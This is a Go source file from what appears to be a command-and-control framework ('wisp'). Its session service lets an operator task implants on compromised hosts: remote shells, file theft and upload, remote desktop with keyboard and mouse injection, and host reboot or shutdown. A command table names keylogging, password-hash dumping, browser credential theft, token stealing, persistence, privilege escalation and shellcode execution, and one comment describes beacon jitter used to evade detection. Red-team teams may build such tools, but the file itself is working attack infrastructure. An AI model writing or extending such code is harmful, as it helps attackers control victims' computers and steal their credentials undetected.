package services

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/user/wisp/internal/db"
	"github.com/user/wisp/internal/server"
	"github.com/user/wisp/shared/protocol"
	"github.com/wailsapp/wails/v3/pkg/application"
)

// FileChunkSize is the raw byte size of one upload/download chunk.
const FileChunkSize = 512 * 1024

// uploadBlock is the per-chunk task args sent to the agent for an upload.
type uploadBlock struct {
	Path  string `json:"path"`
	Index int    `json:"index"`
	Total int    `json:"total"`
	Data  string `json:"data"` // base64 encoded raw bytes
}

// SessionService handles session operations for the frontend.
type SessionService struct {
	serverSvc *ServerService
}

// NewSessionService creates a new SessionService.
func NewSessionService(serverSvc *ServerService) *SessionService {
	return &SessionService{serverSvc: serverSvc}
}

// SessionInfo is the data exposed to the frontend.
type SessionInfo struct {
	ID            string `json:"id"`
	Seq           int    `json:"seq"`
	ListenerID    string `json:"listener_id"`
	Protocol      string `json:"protocol"`
	ExternalIP    string `json:"external_ip"`
	InternalIP    string `json:"internal_ip"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	Domain        string `json:"domain"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	PID           int    `json:"pid"`
	ProcessName   string `json:"process_name"`
	IsElevated    bool   `json:"is_elevated"`
	SleepInterval int    `json:"sleep_interval"`
	Jitter        int    `json:"jitter"`
	FirstSeen     string `json:"first_seen"`
	LastSeen      string `json:"last_seen"`
	Status        string `json:"status"`
	Note          string `json:"note"`
}

// List returns all sessions.
func (ss *SessionService) List() ([]SessionInfo, error) {
	rows, err := ss.serverSvc.GetDB().ListSessions("")
	if err != nil {
		return nil, err
	}

	result := make([]SessionInfo, len(rows))
	for i, r := range rows {
		result[i] = sessionRowToInfo(&r)
	}
	return result, nil
}

// SendCommand sends a command to a session.
func (ss *SessionService) SendCommand(sessionID string, command string, args string) error {
	// Apply script-registered command aliases / pre-hooks (Aggressor-style).
	if resolved, resolvedArgs, ok := ss.serverSvc.resolveCommand(command, args); ok {
		command = resolved
		args = resolvedArgs
	}

	// Unified pre-hook: scripts can rewrite the task command/args before it is
	// queued (this is the task:dispatch hook point; the alias resolver above is
	// the legacy narrow form of the same mechanism).
	hctx := server.TriggerHook("task:dispatch", server.HookPre, map[string]any{
		"session_id": sessionID,
		"command":    command,
		"args":       args,
	}, nil)
	if hctx.Abort {
		return fmt.Errorf("command rejected by hook")
	}
	if c, ok := hctx.Input["command"].(string); ok && c != "" {
		command = c
	}
	if a, ok := hctx.Input["args"].(string); ok {
		args = a
	}

	// Parse command string to command ID
	cmdID := parseCommand(command)
	if cmdID == 0 {
		return fmt.Errorf("unknown command: %s", command)
	}

	// Create task in database
	task, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(cmdID), args)
	if err != nil {
		return err
	}

	// Audit log: persist the input for the session's console history
	_ = ss.serverSvc.GetDB().InsertConsoleLog(sessionID, "input", "> "+command+" "+args)

	// Log the command input
	ss.serverSvc.EmitEvent("session:input", map[string]string{
		"session_id": sessionID,
		"task_id":    task.ID,
		"command":    command,
		"args":       args,
	})

	return nil
}

// ListSessions returns sessions filtered by status, listener and a free-text
// query (hostname/username/IP/ID).
func (ss *SessionService) ListSessions(status, listenerID, query string) ([]db.SessionRow, error) {
	return ss.serverSvc.GetDB().SearchSessions(status, listenerID, query)
}

// UpdateSessionNote sets the operator note of a session.
func (ss *SessionService) UpdateSessionNote(sessionID, note string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if _, err := ss.serverSvc.GetDB().GetSession(sessionID); err != nil {
		return fmt.Errorf("session not found: %w", err)
	}
	return ss.serverSvc.GetDB().UpdateSessionNote(sessionID, note)
}

// DeleteTask removes a task by ID.
func (ss *SessionService) DeleteTask(taskID string) error {
	if taskID == "" {
		return fmt.Errorf("task id is required")
	}
	return ss.serverSvc.GetDB().DeleteTask(taskID)
}

// ClearTasks removes all tasks of a session.
func (ss *SessionService) ClearTasks(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	return ss.serverSvc.GetDB().ClearTasksForSession(sessionID)
}

// RerunTask re-creates a task with the same command and arguments.
func (ss *SessionService) RerunTask(taskID string) (*db.TaskRow, error) {
	orig, err := ss.serverSvc.GetDB().GetTask(taskID)
	if err != nil {
		return nil, fmt.Errorf("task not found: %w", err)
	}
	if _, err := ss.serverSvc.GetDB().GetSession(orig.SessionID); err != nil {
		return nil, fmt.Errorf("session not found: %w", err)
	}
	return ss.serverSvc.GetDB().CreateTask(orig.SessionID, orig.CommandID, orig.Args)
}

// FileList sends a structured directory listing command and returns the task ID
// whose result (JSON) can be consumed via session:output.
func (ss *SessionService) FileList(sessionID, path string) (string, error) {
	// An empty path requests the filesystem roots view (drives on Windows, "/"
	// on Unix) via the "__roots__" marker understood by the agent.
	if path == "" {
		path = "__roots__"
	}
	args, _ := json.Marshal(map[string]string{"path": path})
	return ss.createFileTask(sessionID, int(protocol.CmdLsJSON), string(args), "ls")
}

// FileMkdir sends a directory creation command.
func (ss *SessionService) FileMkdir(sessionID, path string) (string, error) {
	if hasPathTraversal(path) {
		return "", fmt.Errorf("path traversal is not allowed")
	}
	args, _ := json.Marshal(map[string]string{"path": path})
	return ss.createFileTask(sessionID, int(protocol.CmdMkdir), string(args), "mkdir")
}

// FileRemove sends a file/directory removal command.
func (ss *SessionService) FileRemove(sessionID, path string) (string, error) {
	if hasPathTraversal(path) {
		return "", fmt.Errorf("path traversal is not allowed")
	}
	args, _ := json.Marshal(map[string]string{"path": path})
	return ss.createFileTask(sessionID, int(protocol.CmdRm), string(args), "rm")
}

// FileRename sends a rename/move command.
func (ss *SessionService) FileRename(sessionID, oldPath, newPath string) (string, error) {
	if hasPathTraversal(oldPath) || hasPathTraversal(newPath) {
		return "", fmt.Errorf("path traversal is not allowed")
	}
	args, _ := json.Marshal(map[string]string{"old_path": oldPath, "new_path": newPath})
	return ss.createFileTask(sessionID, int(protocol.CmdRename), string(args), "rename")
}

// FileExec sends a command to launch a file on the target machine.
func (ss *SessionService) FileExec(sessionID, path string) (string, error) {
	args, _ := json.Marshal(map[string]string{"path": path})
	return ss.createFileTask(sessionID, int(protocol.CmdExecFile), string(args), "exec")
}

func (ss *SessionService) createFileTask(sessionID string, cmdID int, args, label string) (string, error) {
	if sessionID == "" {
		return "", fmt.Errorf("session id is required")
	}
	if _, err := ss.serverSvc.GetDB().GetSession(sessionID); err != nil {
		return "", fmt.Errorf("session not found: %w", err)
	}
	task, err := ss.serverSvc.GetDB().CreateTask(sessionID, cmdID, args)
	if err != nil {
		return "", err
	}
	_ = ss.serverSvc.GetDB().InsertConsoleLog(sessionID, "input", "> "+label+" "+args)
	ss.serverSvc.EmitEvent("session:input", map[string]string{
		"session_id": sessionID,
		"task_id":    task.ID,
		"command":    label,
		"args":       args,
	})
	return task.ID, nil
}

// IshellOpen starts a persistent interactive shell on the target.
func (ss *SessionService) IshellOpen(sessionID, shell string) (string, error) {
	args, _ := json.Marshal(map[string]string{"shell": shell})
	return ss.createFileTask(sessionID, int(protocol.CmdIshellOpen), string(args), "ishell")
}

// IshellRun sends one input line to the open interactive shell.
func (ss *SessionService) IshellRun(sessionID, input string) (string, error) {
	args, _ := json.Marshal(map[string]string{"input": input})
	return ss.createFileTask(sessionID, int(protocol.CmdIshellRun), string(args), "ishell")
}

// IshellClose terminates the open interactive shell.
func (ss *SessionService) IshellClose(sessionID string) (string, error) {
	return ss.createFileTask(sessionID, int(protocol.CmdIshellClose), "{}", "ishell")
}

// ClientKill terminates the agent process on the target.
func (ss *SessionService) ClientKill(sessionID string) error {
	return ss.createMgmtTask(sessionID, protocol.CmdClientKill, "kill")
}

// HostReboot reboots the target computer.
func (ss *SessionService) HostReboot(sessionID string) error {
	return ss.createMgmtTask(sessionID, protocol.CmdHostReboot, "reboot")
}

// HostShutdown shuts down the target computer.
func (ss *SessionService) HostShutdown(sessionID string) error {
	return ss.createMgmtTask(sessionID, protocol.CmdHostShutdown, "shutdown")
}

// HostLogoff logs off the current user of the target.
func (ss *SessionService) HostLogoff(sessionID string) error {
	return ss.createMgmtTask(sessionID, protocol.CmdHostLogoff, "logoff")
}

// HostLock locks the target workstation (Windows).
func (ss *SessionService) HostLock(sessionID string) error {
	return ss.createMgmtTask(sessionID, protocol.CmdHostLock, "lock")
}

func (ss *SessionService) createMgmtTask(sessionID string, cmdID uint32, label string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if _, err := ss.serverSvc.GetDB().GetSession(sessionID); err != nil {
		return fmt.Errorf("session not found: %w", err)
	}
	if _, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(cmdID), "{}"); err != nil {
		return err
	}
	_ = ss.serverSvc.GetDB().InsertConsoleLog(sessionID, "input", "> "+label)
	ss.serverSvc.EmitEvent("session:input", map[string]string{
		"session_id": sessionID,
		"command":    label,
		"args":       "{}",
	})
	return nil
}

// GetAllTasks returns the most recent tasks across all sessions (task center).
func (ss *SessionService) GetAllTasks(limit int) ([]db.TaskRow, error) {
	return ss.serverSvc.GetDB().ListTasks(limit)
}

// GetAllTransfers returns the most recent file transfer records (download center).
func (ss *SessionService) GetAllTransfers(limit int) ([]db.FileTransferRow, error) {
	return ss.serverSvc.GetDB().ListFileTransfers(limit)
}

// LocalEntry is one row in a local directory listing.
type LocalEntry struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
}

// GetLocalHomeDir returns the operator's home directory (used to seed the
// local directory browser).
func (ss *SessionService) GetLocalHomeDir() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return "C:\\", nil
	}
	return home, nil
}

// ReadLocalFile reads a local text file (bounded) and returns its contents.
// Used by the UI to load a Malleable profile JSON when creating a listener.
func (ss *SessionService) ReadLocalFile(path string) (string, error) {
	if path == "" {
		return "", fmt.Errorf("path is required")
	}
	info, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("stat local file: %w", err)
	}
	if info.IsDir() {
		return "", fmt.Errorf("%s is a directory", path)
	}
	// Bound the read: profiles are small JSON documents.
	const maxProfileBytes = 1 << 20 // 1 MB
	if info.Size() > maxProfileBytes {
		return "", fmt.Errorf("file too large to load as a profile")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("read local file: %w", err)
	}
	return string(data), nil
}

// ListLocalDrives returns the root entries of the operator's filesystem — the
// drive list on Windows ("This PC" view) and a single "/" root on Unix. Used by
// the file manager's local pane when the user is at the top level.
func (ss *SessionService) ListLocalDrives() ([]LocalEntry, error) {
	if runtime.GOOS == "windows" {
		var drives []LocalEntry
		for d := 'A'; d <= 'Z'; d++ {
			root := fmt.Sprintf("%c:\\", d)
			if _, err := os.Stat(root); err == nil {
				drives = append(drives, LocalEntry{Name: root, IsDir: true})
			}
		}
		return drives, nil
	}
	return []LocalEntry{{Name: "/", IsDir: true}}, nil
}

// ListLocalDir returns a directory listing of the operator's local filesystem
// (used by the dual-pane file manager's "local" side).
func (ss *SessionService) ListLocalDir(path string) ([]LocalEntry, error) {
	if path == "" {
		return nil, fmt.Errorf("path is required")
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}
	items := make([]LocalEntry, 0, len(entries))
	for _, e := range entries {
		size, mod := int64(0), ""
		if info, err := e.Info(); err == nil {
			size = info.Size()
			mod = info.ModTime().Format(time.RFC3339)
		}
		items = append(items, LocalEntry{Name: e.Name(), Size: size, IsDir: e.IsDir(), ModTime: mod})
	}
	return items, nil
}

// GetTask returns a single task (used to poll asynchronous file command results).
func (ss *SessionService) GetTask(taskID string) (*db.TaskRow, error) {
	return ss.serverSvc.GetDB().GetTask(taskID)
}

// GetConsoleLogs returns the persisted console history for a session.
func (ss *SessionService) GetConsoleLogs(sessionID string, limit int) ([]db.ConsoleLogEntry, error) {
	return ss.serverSvc.GetDB().ListConsoleLogs(sessionID, limit)
}

// GetAllLogs returns the most recent audit logs across all sessions.
func (ss *SessionService) GetAllLogs(limit int) ([]db.ConsoleLogEntry, error) {
	return ss.serverSvc.GetDB().ListAllConsoleLogs(limit)
}

// ClearConsoleLogs removes the persisted console history for a session.
func (ss *SessionService) ClearConsoleLogs(sessionID string) error {
	return ss.serverSvc.GetDB().ClearConsoleLogs(sessionID)
}

// GetHistory returns the task history for a session.
func (ss *SessionService) GetHistory(sessionID string) ([]map[string]any, error) {
	tasks, err := ss.serverSvc.GetDB().ListTasksForSession(sessionID)
	if err != nil {
		return nil, err
	}

	var result []map[string]any
	for _, t := range tasks {
		entry := map[string]any{
			"id":         t.ID,
			"command_id": t.CommandID,
			"args":       t.Args,
			"status":     t.Status,
			"result":     t.Result,
			"created_at": t.CreatedAt.Format("2006-01-02 15:04:05"),
		}
		if t.CompletedAt != nil {
			entry["completed_at"] = t.CompletedAt.Format("2006-01-02 15:04:05")
		}
		result = append(result, entry)
	}
	return result, nil
}

// RemoveSession marks a session as dead or deletes it.
// SetSessionStatus overrides a session's status (e.g. mark dead / restore).
func (ss *SessionService) SetSessionStatus(sessionID, status string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if status != protocol.StatusAlive && status != protocol.StatusDead {
		return fmt.Errorf("invalid status: %s", status)
	}
	// Keep the in-memory state in sync
	if as := ss.serverSvc.GetServer().GetSession(sessionID); as != nil {
		as.Info.Status = status
	}
	return ss.serverSvc.GetDB().UpdateSessionStatus(sessionID, status)
}

func (ss *SessionService) RemoveSession(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if err := ss.serverSvc.GetDB().DeleteSession(sessionID); err != nil {
		return err
	}
	// Drop the in-memory state and notify the frontend so the row disappears
	ss.serverSvc.GetServer().RemoveSession(sessionID)
	ss.serverSvc.EmitEvent("session:removed", sessionID)
	return nil
}

// OpenRemoteDesktopWindow opens a separate OS window rendering the remote
// desktop view for the session (frontend route "/?view=rdp&session=<id>").
func (ss *SessionService) OpenRemoteDesktopWindow(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	app := ss.serverSvc.GetApp()
	if app == nil {
		return fmt.Errorf("wails app is not ready")
	}
	title := "Remote Desktop"
	if sess, err := ss.serverSvc.GetDB().GetSession(sessionID); err == nil && sess.Hostname != "" {
		title = fmt.Sprintf("Remote Desktop — %s (%s)", sess.Hostname, sess.Username)
	}
	app.Window.NewWithOptions(application.WebviewWindowOptions{
		Title:  title,
		Width:  960,
		Height: 640,
		URL:    "/?view=rdp&session=" + sessionID,
	}).Show()
	return nil
}

// RemoteDesktopStart begins a screen capture stream on the agent. Frames are
// reported on every checkin and relayed to the frontend as "rdp:frame" events.
// jitter is the stream-time jitter (0-100%): while the stream runs the agent
// tightens its checkin interval to <interval>ms plus <jitter>% so the beacon
// does not become mechanically regular. On stop the agent restores the
// session's previous sleep and jitter.
func (ss *SessionService) RemoteDesktopStart(sessionID string, interval, quality, jitter int) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	if interval <= 0 {
		interval = 500
	}
	if quality <= 0 {
		quality = 50
	}
	if quality > 100 {
		quality = 100
	}
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}

	// The agent restores this sleep/jitter when the stream stops
	restore := 5000
	restoreJitter := 0
	if sess, err := ss.serverSvc.GetDB().GetSession(sessionID); err == nil {
		if sess.SleepInterval > 0 {
			restore = sess.SleepInterval
		}
		restoreJitter = sess.Jitter
	}

	args, err := json.Marshal(map[string]any{
		"frame_task_id":  "rdp:" + sessionID,
		"interval":       interval,
		"quality":        quality,
		"jitter":         jitter,
		"restore_sleep":  restore,
		"restore_jitter": restoreJitter,
	})
	if err != nil {
		return err
	}
	_, err = ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdRDPStart), string(args))
	return err
}

// RemoteDesktopStop halts the screen capture stream on the agent.
func (ss *SessionService) RemoteDesktopStop(sessionID string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	_, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdRDPStop), "{}")
	return err
}

// RemoteDesktopInput injects a mouse / keyboard event on the target.
// inputJSON: {"type":"move"|"click"|"key","x":..,"y":..,"button":"left"|"right","code":..,"down":bool}
func (ss *SessionService) RemoteDesktopInput(sessionID, inputJSON string) error {
	if sessionID == "" {
		return fmt.Errorf("session id is required")
	}
	_, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdRDPInput), inputJSON)
	return err
}

// RunCommand sends a one-shot console command (e.g. sysinfo, ps, kill) and
// returns the task ID whose result can be polled with GetTask. This mirrors
// createFileTask so tab-based views (system info / process manager) do not have
// to scrape the history for the latest task.
func (ss *SessionService) RunCommand(sessionID, command, args string) (string, error) {
	cmdID := parseCommand(command)
	if cmdID == 0 {
		return "", fmt.Errorf("unknown command: %s", command)
	}
	return ss.createFileTask(sessionID, int(cmdID), args, command)
}

// SendShell is a convenience method for shell commands.
func (ss *SessionService) SendShell(sessionID, cmd string) error {
	argsJSON, _ := json.Marshal(map[string]string{"cmd": cmd})
	return ss.SendCommand(sessionID, "shell", string(argsJSON))
}

// DownloadFile sends a download task for a file on the agent. The server
// aggregates the arriving chunks and writes the final file to savePath.
func (ss *SessionService) DownloadFile(sessionID, remotePath, savePath string) error {
	if remotePath == "" {
		return fmt.Errorf("remote path is required")
	}
	if savePath == "" {
		return fmt.Errorf("save path is required")
	}
	if hasPathTraversal(remotePath) {
		return fmt.Errorf("path traversal is not allowed")
	}

	if _, err := ss.serverSvc.GetDB().GetSession(sessionID); err != nil {
		return fmt.Errorf("session not found: %w", err)
	}

	task, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdDownload), remotePath)
	if err != nil {
		return err
	}

	// Record the transfer for the Download Center
	_ = ss.serverSvc.GetDB().CreateFileTransfer(sessionID, "download", savePath, remotePath, 0, "started", task.ID)

	ss.serverSvc.GetServer().RegisterDownload(task.ID, savePath)
	_ = ss.serverSvc.GetDB().InsertConsoleLog(sessionID, "input", "> download "+remotePath)
	ss.serverSvc.EmitEvent("session:input", map[string]string{
		"session_id": sessionID,
		"task_id":    task.ID,
		"command":    "download",
		"args":       remotePath,
	})
	return nil
}

// UploadFile reads a local file and creates chunked upload tasks so the agent
// reassembles it at remotePath. It returns the number of chunks scheduled.
func (ss *SessionService) UploadFile(sessionID, localPath, remotePath string) (int, error) {
	if localPath == "" {
		return 0, fmt.Errorf("local path is required")
	}
	if remotePath == "" {
		return 0, fmt.Errorf("remote path is required")
	}
	if hasPathTraversal(remotePath) {
		return 0, fmt.Errorf("path traversal is not allowed")
	}

	if _, err := ss.serverSvc.GetDB().GetSession(sessionID); err != nil {
		return 0, fmt.Errorf("session not found: %w", err)
	}

	data, err := os.ReadFile(localPath)
	if err != nil {
		return 0, fmt.Errorf("read local file: %w", err)
	}

	total := (len(data) + FileChunkSize - 1) / FileChunkSize
	if total == 0 {
		total = 1
	}

	// Record the transfer for the Download Center
	_ = ss.serverSvc.GetDB().CreateFileTransfer(sessionID, "upload", localPath, remotePath, int64(len(data)), "started", "")

	count := 0
	for i := 0; i < total; i++ {
		start := i * FileChunkSize
		end := start + FileChunkSize
		if end > len(data) {
			end = len(data)
		}
		blk := uploadBlock{
			Path:  remotePath,
			Index: i,
			Total: total,
			Data:  base64.StdEncoding.EncodeToString(data[start:end]),
		}
		args, _ := json.Marshal(blk)
		if _, err := ss.serverSvc.GetDB().CreateTask(sessionID, int(protocol.CmdUpload), string(args)); err != nil {
			return count, err
		}
		count++
	}

	_ = ss.serverSvc.GetDB().InsertConsoleLog(sessionID, "input", "> upload "+localPath+" -> "+remotePath)
	ss.serverSvc.EmitEvent("session:input", map[string]string{
		"session_id": sessionID,
		"task_id":    fmt.Sprintf("upload-%d-chunks", count),
		"command":    "upload",
		"args":       remotePath,
	})
	return count, nil
}

// hasPathTraversal rejects paths containing ".." components.
func hasPathTraversal(p string) bool {
	for _, part := range strings.FieldsFunc(p, func(r rune) bool {
		return r == '/' || r == '\\'
	}) {
		if part == ".." {
			return true
		}
	}
	return false
}

func sessionRowToInfo(r *db.SessionRow) SessionInfo {
	return SessionInfo{
		ID:            r.ID,
		Seq:           r.Seq,
		ListenerID:    r.ListenerID,
		Protocol:      r.Protocol,
		ExternalIP:    r.ExternalIP,
		InternalIP:    r.InternalIP,
		Hostname:      r.Hostname,
		Username:      r.Username,
		Domain:        r.Domain,
		OS:            r.OS,
		Arch:          r.Arch,
		PID:           r.PID,
		ProcessName:   r.ProcessName,
		IsElevated:    r.IsElevated,
		SleepInterval: r.SleepInterval,
		Jitter:        r.Jitter,
		FirstSeen:     r.FirstSeen.Format("2006-01-02 15:04:05"),
		LastSeen:      r.LastSeen.Format("2006-01-02 15:04:05"),
		Status:        r.Status,
		Note:          r.Note,
	}
}

func parseCommand(cmd string) uint32 {
	switch cmd {
	case "shell":
		return protocol.CmdShell
	case "ls":
		return protocol.CmdLs
	case "cd":
		return protocol.CmdCd
	case "cat":
		return protocol.CmdCat
	case "pwd":
		return protocol.CmdPwd
	case "upload":
		return protocol.CmdUpload
	case "download":
		return protocol.CmdDownload
	case "ps":
		return protocol.CmdPs
	case "kill":
		return protocol.CmdKillProc
	case "sysinfo":
		return protocol.CmdSysinfo
	case "sleep":
		return protocol.CmdSleep
	case "exit":
		return protocol.CmdExit
	case "kill-agent":
		return protocol.CmdClientKill
	case "reboot":
		return protocol.CmdHostReboot
	case "shutdown":
		return protocol.CmdHostShutdown
	case "logoff":
		return protocol.CmdHostLogoff
	case "lock":
		return protocol.CmdHostLock
	case "shellcode":
		return protocol.CmdExecShellcode
	case "spawn":
		return protocol.CmdSpawn
	case "bof":
		return protocol.CmdBOF
	case "jobs":
		return protocol.CmdJobList
	case "job-kill":
		return protocol.CmdJobKill
	case "portscan":
		return protocol.CmdPortscan
	case "socks":
		return protocol.CmdSocks
	case "portfwd":
		return protocol.CmdPortfwd
	case "keylog":
		return protocol.CmdKeylog
	case "clipboard":
		return protocol.CmdClipboard
	case "token-steal":
		return protocol.CmdTokenSteal
	case "token-revert":
		return protocol.CmdTokenRevert
	case "netenum":
		return protocol.CmdNetEnum
	case "hashdump":
		return protocol.CmdHashdump
	case "browser-creds":
		return protocol.CmdBrowserCreds
	case "persist":
		return protocol.CmdPersist
	case "getsystem":
		return protocol.CmdGetSystem
	case "diag-ssn":
		return protocol.CmdDiagSSN
	default:
		return 0
	}
}
